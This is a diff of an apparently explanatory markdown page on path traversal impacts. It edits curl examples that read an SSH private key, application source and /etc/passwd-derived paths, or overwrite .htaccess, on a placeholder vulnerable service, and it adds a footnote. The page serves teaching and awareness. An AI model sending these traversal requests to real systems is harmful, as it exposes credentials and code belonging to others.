@@ -8,7 +8,7 @@
 
 ### Credentials used for remote access can be exposed.
 
-- SSH key file exposure
+- SSH key file exposure [^1]
    ```bash
    curl https://[VULNERABLE-SERVICE]/read?filename=../../../../home/user/.ssh/id_rsa
    ```
@@ -27,7 +27,7 @@
 
 - Source code exposure
    ```bash
-   curl https://[VULNERABLE-SERVICE]/read?filename=../../../../app.js
+   curl https://[VULNERABLE-SERVICE]/read?filename=../../../../var/www/html/index.php
    ```
 
 - Application’s environment variable information exposure
@@ -58,3 +58,5 @@
    ```bash
    curl https://[VULNERABLE-SERVICE]/upload?filename=../../../../.htaccess
    ```
+
+[^1]: Path to the user's home directory can be found in /etc/passwd.
